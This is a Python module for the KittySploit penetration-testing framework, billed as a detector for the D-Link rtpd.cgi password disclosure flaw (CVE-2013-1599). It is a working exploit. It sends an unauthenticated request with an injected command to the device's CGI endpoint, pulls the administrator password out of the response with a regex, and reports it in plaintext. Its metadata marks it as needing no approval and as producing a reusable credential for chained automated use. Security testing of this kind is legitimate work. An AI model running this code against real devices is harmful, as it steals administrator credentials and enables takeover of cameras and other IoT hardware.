#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link rtpd.cgi password disclosure (CVE-2013-1599)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link - rtpd.cgi Password Disclosure Detection (CVE-2013-1599)',
        'description': (
            'Detects CVE-2013-1599 by requesting '
            '/cgi-bin/rtpd.cgi?echo&AdminPasswd_ss|tdb&get&HTTPAccount.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'dlink', 'iot', 'info-disclosure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'credential', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-1599',
        ],
        'cve': 'CVE-2013-1599',
    }

    def run(self):
        path = '/cgi-bin/rtpd.cgi?echo&AdminPasswd_ss|tdb&get&HTTPAccount'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        m = re.search(r'AdminPasswd_ss="([^"]+)"', r.text or '')
        if m:
            self.set_info(
                severity='critical',
                reason=f'D-Link rtpd.cgi password disclosure ({m.group(1)})',
                path='/cgi-bin/rtpd.cgi',
            )
            return True
        return False
